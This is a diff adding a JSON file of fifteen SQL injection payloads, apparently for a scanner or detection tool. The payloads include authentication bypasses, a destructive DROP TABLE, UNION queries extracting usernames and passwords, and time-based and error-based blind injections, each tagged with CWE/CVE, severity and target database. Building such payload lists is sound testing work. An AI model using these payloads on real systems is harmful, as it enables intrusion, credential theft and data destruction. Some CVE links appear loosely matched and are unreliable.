@@ -1,0 +1,122 @@
+[
+  {
+    "value": "' OR '1'='1",
+    "description": "Classic SQL authentication bypass via always-true condition",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "critical",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "' OR 1=1--",
+    "description": "SQL injection with comment to bypass authentication",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "critical",
+    "dbTarget": "mysql"
+  },
+  {
+    "value": "' OR 1=1#",
+    "description": "MySQL-specific SQL injection bypass using hash comment",
+    "cveId": "CVE-2023-23488",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23488",
+    "severity": "critical",
+    "dbTarget": "mysql"
+  },
+  {
+    "value": "'; DROP TABLE users--",
+    "description": "SQL injection drop table (destructive payload - detection only)",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "critical",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "' UNION SELECT NULL,NULL,NULL--",
+    "description": "SQL UNION-based injection to enumerate columns",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "high",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "' UNION SELECT username,password,NULL FROM users--",
+    "description": "SQL UNION injection attempting to extract user credentials",
+    "cveId": "CVE-2021-25646",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25646",
+    "severity": "critical",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "1; WAITFOR DELAY '0:0:5'--",
+    "description": "SQL Server time-based blind injection using WAITFOR",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection+blind",
+    "severity": "high",
+    "dbTarget": "sqlserver"
+  },
+  {
+    "value": "1 AND SLEEP(5)--",
+    "description": "MySQL time-based blind injection using SLEEP",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection+blind",
+    "severity": "high",
+    "dbTarget": "mysql"
+  },
+  {
+    "value": "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+    "description": "Oracle time-based blind injection",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "high",
+    "dbTarget": "oracle"
+  },
+  {
+    "value": "' AND pg_sleep(5)--",
+    "description": "PostgreSQL time-based blind injection using pg_sleep",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "high",
+    "dbTarget": "postgres"
+  },
+  {
+    "value": "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
+    "description": "SQL Server error-based injection to enumerate table names",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "high",
+    "dbTarget": "sqlserver"
+  },
+  {
+    "value": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    "description": "MySQL error-based injection using EXTRACTVALUE to leak data",
+    "cveId": "CVE-2022-21661",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661",
+    "severity": "high",
+    "dbTarget": "mysql"
+  },
+  {
+    "value": "admin'--",
+    "description": "SQL comment-based authentication bypass on username field",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "critical",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "' OR 'x'='x",
+    "description": "Alternative always-true SQL injection variant",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "critical",
+    "dbTarget": "generic"
+  },
+  {
+    "value": "1 OR 1=1 ORDER BY 1--",
+    "description": "Numeric SQL injection with ORDER BY to infer column count",
+    "cveId": "CWE-89",
+    "cveUrl": "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=sql+injection",
+    "severity": "medium",
+    "dbTarget": "generic"
+  }
+]
